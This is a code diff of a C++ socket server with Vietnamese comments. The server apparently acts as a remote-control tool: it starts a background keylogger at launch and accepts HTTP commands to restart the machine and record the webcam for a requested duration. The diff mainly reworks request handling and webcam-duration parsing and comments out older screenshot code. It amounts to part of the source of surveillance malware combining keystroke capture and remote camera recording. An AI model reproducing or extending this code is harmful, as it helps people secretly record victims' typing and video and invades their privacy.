@@ -15,6 +15,7 @@
 #include "webcam.h"
 #include "system.h"
 
+
 int main() {
     
     std::thread loggerThread(StartKeyloggerThread);
@@ -36,14 +37,52 @@ int main() {
     std::cout << "Server running on port " << PORT << "...\n";
     std::cout << "Keylogger is active in background...\n";
 
+//     ///////////////
+//         char buffer[BUFFER_SIZE] = {0};
+//         int bytesReceived = recv(client_socket, buffer, BUFFER_SIZE, 0); // Thêm biến kiểm tra bytesReceived
+        
+//         if (bytesReceived <= 0) { // Kiểm tra lỗi ngắt kết nối
+//             closesocket(client_socket);
+//             continue;
+//         }
+
+//         // --- SỬA LỖI Ở ĐÂY ---
+//         std::string request(buffer);      // Biến chứa toàn bộ gói tin (Header + Body)
+//         std::string request_body = request; // Tạo alias request_body để khớp với code bên dưới của bạn
+        
+//         // Lấy dòng đầu tiên: GET /path HTTP/1.1
+//         std::stringstream ss(request);
+//         std::string method, full_path;
+//         ss >> method >> full_path;
+
+//         if (method.empty()) {
+//             closesocket(client_socket);
+//             continue;
+//         }
+
+//         std::string route = get_route_path(full_path);
+//         std::map<std::string, std::string> query = parse_query(full_path);
+//         std::string response;
+
+//         std::cout << "Request: " << route << " | Method: " << method << std::endl;
+// //////////////
+
+
     while (true) {
         SOCKET client_socket = accept(server_fd, NULL, NULL);
         if (client_socket == INVALID_SOCKET) continue;
 
         char buffer[BUFFER_SIZE] = {0};
-        recv(client_socket, buffer, BUFFER_SIZE, 0);
-        
+        int bytesReceived = recv(client_socket, buffer, BUFFER_SIZE, 0);
+
+        if (bytesReceived <= 0) { // Kiểm tra lỗi ngắt kết nối
+            closesocket(client_socket);
+            continue;
+        }
         std::string request(buffer);
+        std::string request_body = request;
+
+        
         // Lấy dòng đầu tiên: GET /path HTTP/1.1
         std::stringstream ss(request);
         std::string method, full_path;
@@ -102,24 +141,60 @@ int main() {
             response = system_control("restart");
         }
 
-        else if (route == "/screenshot") {
-            std::string filename = take_screenshot();
-            response = http_response("Screenshot saved as: " + filename);
-        }
+    //     else if (route == "/webcam") {
+    //         std::string filename = take_screenshot();
+    //         response = http_response("Screenshot saved as: " + filename);
+    //     }
 
-        // --- ROUTE QUAY WEBCAM ---
+    //     // --- ROUTE QUAY WEBCAM ---
+    //     else if (route == "/webcam") {
+    //         int duration = 10;
+    //         if (query.find("duration") != query.end()) {
+    //             try { duration = std::stoi(query["duration"]); } catch(...) {}
+    //         }
+
+    //         std::cout << "Recording webcam for " << duration << "s..." << std::endl;
+    //         std::string filename = start_webcam_recording(duration);
+    //         response = http_response("Started recording webcam. File: " + filename);
+    //     }
+
+
+    //     else {
+    //         response = http_response("Feature not implemented yet (Screenshot/Webcam req OpenCV)", "404 Not Found");
+    //     }
+
+    //     send(client_socket, response.c_str(), response.length(), 0);
+    //     closesocket(client_socket);
+    // }
+
         else if (route == "/webcam") {
-            int duration = 10;
-            if (query.find("duration") != query.end()) {
-                try { duration = std::stoi(query["duration"]); } catch(...) {}
+            std::cout << ">> Nhan lenh quay Webcam..." << std::endl;
+
+            int seconds = 10;
+
+            std::string searchKey = "\"seconds\":\"";
+            size_t pos = request_body.find(searchKey); 
+            
+            if (pos != std::string::npos) {
+                size_t start = pos + searchKey.length();
+                size_t end = request_body.find("\"", start);
+                if (end != std::string::npos) {
+                    std::string secStr = request_body.substr(start, end - start);
+                    try {
+                        seconds = std::stoi(secStr);
+                    } catch (...) {
+                        seconds = 10; 
+                    }
+                }
             }
+            
+            std::cout << ">> Thoi luong: " << seconds << "s. Dang quay..." << std::endl;
 
-            std::cout << "Recording webcam for " << duration << "s..." << std::endl;
-            std::string filename = start_webcam_recording(duration);
-            response = http_response("Started recording webcam. File: " + filename);
+            std::string videoPath = start_webcam_recording(seconds);
+            
+            response = http_response(videoPath);
         }
-
-
+        
         else {
             response = http_response("Feature not implemented yet (Screenshot/Webcam req OpenCV)", "404 Not Found");
         }
